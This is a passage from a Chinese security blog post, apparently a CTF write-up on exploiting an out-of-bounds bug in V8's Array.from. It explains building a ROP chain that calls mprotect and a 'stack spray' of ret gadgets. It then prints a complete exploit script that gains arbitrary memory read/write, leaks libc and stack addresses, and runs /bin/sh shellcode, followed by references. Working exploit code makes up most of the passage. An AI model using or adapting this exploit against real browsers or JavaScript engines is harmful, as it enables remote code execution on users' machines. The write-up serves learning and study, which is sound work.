title="ROP"></a>ROP</h2><p>布置完成shellcode之后，我们需要通过rop来修改shellcode所在内存执行权限。</p><p>首先构造出我们的rop链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> pop_rdi = <span class="number">0x0000000000021102</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rsi = <span class="number">0x00000000000202e8</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdx = <span class="number">0x0000000000001b92</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> mprotect = <span class="number">0x0000000000101770</span> +libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop =  [</span><br><span class="line">	pop_rdi,</span><br><span class="line">	<span class="built_in">parseInt</span>(shell_addr / <span class="number">0x1000</span>) * <span class="number">0x1000</span>,	<span class="comment">//shellcode的地址，需要对齐</span></span><br><span class="line">	pop_rsi,</span><br><span class="line">	<span class="number">4096</span>,</span><br><span class="line">	pop_rdx,</span><br><span class="line">	<span class="number">7</span>,</span><br><span class="line">	mprotect,								<span class="comment">//调用mprotect修改内存权限</span></span><br><span class="line">	shell_addr								<span class="comment">//返回地址为shellcode</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>构造好rop链之后，就要考虑如何劫持程序流程到rop链上了。</p><p>前文我们成功泄露出了栈地址，这里我们将采用一个技巧（和堆喷类似，我叫它栈喷2333）。</p><p>因为我们获得的栈地址几乎可以说是栈最高的地址，所以我们可以在栈上地址由高到低连续布置retn，这样一旦程序的某个返回地址被我们的retn覆盖，那么程序就会不断的retn下去。</p><p>只要我们在最高地址处布置上我们的rop链，那么程序在经过一段retn之后，就会来到我们的rop链上了。</p><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> retn = <span class="number">0x000000000007EF0D</span> + libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop_start = stack_addr - <span class="number">8</span> * (rop.length + <span class="number">1</span>);	<span class="comment">//先将栈提高，以免修改到了环境变量</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;	</span><br><span class="line">	arw.write(rop_start + <span class="number">8</span> * i, rop[i]);			<span class="comment">//在高地址布置上我们的shellcode</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;					<span class="comment">//不断向低地址写retn</span></span><br><span class="line">	rop_start -= <span class="number">8</span>;</span><br><span class="line">	arw.write(rop_start, retn);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"done"</span>);</span><br></pre></td></tr></table></figure><p>这里写入了0x100个retn是实验出来的，值太大或太小都不能成功。</p><h2 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h2><p><img src="/post/abaa2e35/getshell.png" alt="getshell.png"></p><p><strong>EXP</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memory</span></span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">		<span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">		<span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">		<span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">	&#125;</span><br><span class="line">	d2u(val)&#123;</span><br><span class="line">		<span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">		<span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	u2d(val)&#123;</span><br><span class="line">		<span class="keyword">let</span> tmp = [];</span><br><span class="line">		tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">		tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">		<span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> objs = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray; &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">	&#123;</span><br><span class="line">		counter : <span class="number">0</span>,</span><br><span class="line">		next() &#123;</span><br><span class="line">			<span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">			<span class="keyword">this</span>.counter++;</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">				oobArray.length = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i++) &#123;</span><br><span class="line">					bufs.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1234</span>));</span><br><span class="line">					<span class="keyword">let</span> obj = &#123;<span class="string">'a'</span>: <span class="number">0x4321</span>, <span class="string">'b'</span>: <span class="number">0x9999</span>&#125;;</span><br><span class="line">					objs.push(obj);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;&#125;	<span class="comment">//没什么用，但是去掉后栈的位置会迷之提高（地址偏低），导致后面布置ROP失败</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可控的buf在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> buf_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x123400000000</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"buf_offset: "</span> + i.toString());</span><br><span class="line">		buf_offset = i;</span><br><span class="line">		oobArray[i] = mem.u2d(<span class="number">0x121200000000</span>);	<span class="comment">//修改可控buf的size，做个标记</span></span><br><span class="line">		oobArray[i + <span class="number">3</span>] = mem.u2d(<span class="number">0x1212</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可控的obj在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> obj_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x432100000000</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"obj_offset: "</span> + i.toString());</span><br><span class="line">		obj_offset = i;</span><br><span class="line">		oobArray[i] = mem.u2d(<span class="number">0x567800000000</span>); <span class="comment">//修改可控obj的属性a，做个标记</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bufs中的第i个buf是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_buf_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bufs.length; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = bufs[i].byteLength;</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x1212</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"found controllable buf at idx "</span> + i.toString());</span><br><span class="line">		controllable_buf_idx = i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objs中第i个obj是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_obj_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; objs.length; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> val = objs[i].a;</span><br><span class="line">	<span class="keyword">if</span>(val === <span class="number">0x5678</span>)&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">"found controllable obj at idx "</span> + i.toString());</span><br><span class="line">		controllable_obj_idx = i;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> heap_addr = mem.d2u(oobArray[buf_offset + <span class="number">1</span>]) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"heap_addr: 0x"</span> + heap_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">arbitraryRW</span></span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>(buf_offset, buf_idx, obj_offset, obj_idx)&#123;</span><br><span class="line">		<span class="keyword">this</span>.buf_offset = buf_offset;</span><br><span class="line">		<span class="keyword">this</span>.buf_idx = buf_idx;</span><br><span class="line">		<span class="keyword">this</span>.obj_offset = obj_offset;</span><br><span class="line">		<span class="keyword">this</span>.obj_idx = obj_idx;</span><br><span class="line">	&#125;</span><br><span class="line">	leak_obj(obj)&#123;</span><br><span class="line">		objs[<span class="keyword">this</span>.obj_idx].a = obj;</span><br><span class="line">		<span class="keyword">return</span> mem.d2u(oobArray[<span class="keyword">this</span>.obj_offset]) - <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	read(addr)&#123;</span><br><span class="line">		<span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">		oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);</span><br><span class="line">		oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> mem.d2u(tmp[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr, val)&#123;</span><br><span class="line">		<span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">		oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);</span><br><span class="line">		oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);</span><br><span class="line">		<span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">		tmp.set([mem.u2d(val)]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arw = <span class="keyword">new</span> arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> curr_chunk = heap_addr;</span><br><span class="line"><span class="keyword">let</span> searched = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x5000</span>; i++)&#123;</span><br><span class="line">	<span class="keyword">let</span> size = arw.read(curr_chunk + <span class="number">0x8</span>);</span><br><span class="line">	<span class="keyword">let</span> prev_size = arw.read(curr_chunk);</span><br><span class="line">	<span class="keyword">if</span>(size !== <span class="number">0</span> &amp;&amp; size % <span class="number">2</span> === <span class="number">0</span> &amp;&amp; prev_size &lt;= <span class="number">0x3f0</span>)&#123;</span><br><span class="line">		<span class="keyword">let</span> tmp_ptr = curr_chunk - prev_size;</span><br><span class="line">		<span class="keyword">let</span> fd = arw.read(tmp_ptr + <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">let</span> bk = arw.read(tmp_ptr + <span class="number">0x18</span>)</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">parseInt</span>(fd / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">			searched = fd;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">parseInt</span>(bk / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">			searched = bk;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span>(size &lt; <span class="number">0x20</span>) &#123;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	size = <span class="built_in">parseInt</span>(size / <span class="number">8</span>) * <span class="number">8</span></span><br><span class="line">	curr_chunk += size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(searched !== <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> libc_base = <span class="built_in">parseInt</span>((searched - <span class="number">0x3c4000</span>) / <span class="number">0x1000</span>) * <span class="number">0x1000</span>;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"searched libc_base: 0x"</span> + libc_base.toString(<span class="number">16</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"Not found"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//修改malloc_hook实现getshell</span></span><br><span class="line"><span class="comment">malloc_hook = 0x3c4b10 + libc_base;</span></span><br><span class="line"><span class="comment">one_gadet = 0x4526a + libc_base;</span></span><br><span class="line"><span class="comment">arw.write(malloc_hook, [mem.u2d(one_gadet)]);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> environ_addr = libc_base + <span class="number">0x3C6F38</span>;</span><br><span class="line"><span class="keyword">let</span> stack_addr = arw.read(environ_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"stack_addr: 0x"</span> + stack_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc = [<span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0xd1</span>, <span class="number">0x9d</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0xd0</span>, <span class="number">0x8c</span>, <span class="number">0x97</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xdb</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">let</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++)&#123;</span><br><span class="line">	shellcode[i] = sc[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_addr = arw.read(arw.leak_obj(shellcode) + <span class="number">0x68</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"shell_addr: 0x"</span> + shell_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> retn = <span class="number">0x000000000007EF0D</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdi = <span class="number">0x0000000000021102</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rsi = <span class="number">0x00000000000202e8</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdx = <span class="number">0x0000000000001b92</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> mprotect = <span class="number">0x0000000000101770</span> +libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop =  [</span><br><span class="line">	pop_rdi,</span><br><span class="line">	<span class="built_in">parseInt</span>(shell_addr / <span class="number">0x1000</span>) * <span class="number">0x1000</span>,</span><br><span class="line">	pop_rsi,</span><br><span class="line">	<span class="number">4096</span>,</span><br><span class="line">	pop_rdx,</span><br><span class="line">	<span class="number">7</span>,</span><br><span class="line">	mprotect,</span><br><span class="line">	shell_addr</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop_start = stack_addr - <span class="number">8</span> * (rop.length + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;</span><br><span class="line">	arw.write(rop_start + <span class="number">8</span> * i, rop[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">	rop_start -= <span class="number">8</span>;</span><br><span class="line">	arw.write(rop_start, retn);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"done"</span>);</span><br></pre></td></tr></table></figure><p></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然写完了exp，但是还是有一个玄学问题没有解决，在exp中必须要添加一个没什么用的函数并jit优化它，然后才能成功getshell。如果将它去掉，那么在最后”栈喷”的时候，程序的rsp距离我们泄露的栈地址贼远，没办法喷过去2333，调了很久也没弄清楚原因，希望有大佬知道的话能够告知一下。<br>（萌新刚入门，文章如果有错误请师傅们谅解，如果发现我一定更正。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><h2 id="v8基础"><a href="#v8基础" class="headerlink" title="v8基础"></a>v8基础</h2><ul><li><a href="http://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">sakura师傅的《v8 exploit》</a></li><li><a href="https://zhuanlan.zhihu.com/p/24982678" target="_blank" rel="noopener">V8 Object 内存结构与属性访问详解</a></li><li><a href="https://hijiangtao.github.io/2018/06/17/Shapes-ICs/" target="_blank" rel="noopener">[译] JavaScript 引擎基础：Shapes 和 Inline Caches</a></li><li><a href="http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation" target="_blank" rel="noopener">A tour of V8: object representation</a></li><li><a href="https://v8.dev/blog/fast-properties" target="_blank" rel="noopener">Fast properties in V8</a></li></ul><h2 id="v8利用"><a href="#v8利用" class="headerlink" title="v8利用"></a>v8利用</h2><ul><li><a href="http://eternalsakura13.com/2018/11/19/justintime/" target="_blank" rel="noopener">Google CTF justintime exploit</a></li><li><a href="https://www.anquanke.com/post/id/147829#h3-3" target="_blank" rel="noopener">扔个骰子学v8 - 从Plaid CTF roll a d8开始</a></li><li><a href="https://github.com/Hpasserby/aSiagaming/tree/master/Chrome-v8-PCTF-roll-a-d8" target="_blank" rel="noopener">aSiagaming-PCTF 2018 Roll a d8</a></li></ul></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Hpasserby</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://hpasserby.me/post/abaa2e35.html">https://hpasserby.me/post/abaa2e35.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hpasserby.me">Hpasserby</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/v8/">v8</a><a class="post-meta__tags" href="/tags/OOB/">OOB</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="/images/alipay.jpg"><div class="post-qr-code__desc">支付宝赞赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="/images/wechat.jpg"><div class="post-qr-code__desc">微信赞赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/post/204eb42c.html"><i class="fa fa-chevron-left"></i><span>os复习</span></a></div><div class="next-post pull-right"><a href="/post/ef2727d8.html"><span>IE整数溢出漏洞[cve-2013-2551]分析</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk=new Gitalk({clientID:"f19a99b101901554beb9",clientSecret:"624e4f114c26477264046664ef4570cb7bacd636",repo:"Hpasserby.github.io",owner:"Hpasserby",admin:"Hpasserby",id:md5(decodeURI(location.pathname)),language:"zh-CN"});gitalk.render("gitalk-container")</script></div></div><footer class="footer-bg" style="background-image:url(/images/head.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Hpasserby</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text"><span>Hosted by <a href="https://pages.coding.me" style="font-weight:700">Coding Pages</a></span></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script 